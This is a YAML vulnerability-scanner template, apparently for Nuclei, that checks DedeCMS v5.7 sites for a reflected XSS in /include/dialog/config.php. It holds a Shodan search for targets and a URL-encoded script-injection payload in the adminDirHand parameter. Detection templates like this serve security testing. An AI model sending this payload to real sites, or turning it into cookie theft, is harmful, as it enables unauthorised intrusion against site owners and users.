id: dedecms-config-xss
info:
  author: ritikchaddha
  description: 'DeDeCMS v5.7 has an XSS vulnerability in the ''/include/dialog/config.php''
    file, and attackers can use this vulnerability to steal user cookies, hang horses,
    etc.

    '
  metadata:
    shodan-query: http.html:"DedeCms"
    verified: true
  name: DedeCMS V5.7 config.php XSS
  reference:
  - https://www.zilyun.com/8665.html
  - https://www.60ru.com/161.html
  - https://www.cnblogs.com/milantgh/p/3615853.html
  severity: medium
  tags: dedecms,xss
requests:
- matchers:
  - part: body
    type: word
    words:
    - location='../../</script><script>alert(document.domain)</script>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/include/dialog/config.php?adminDirHand=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
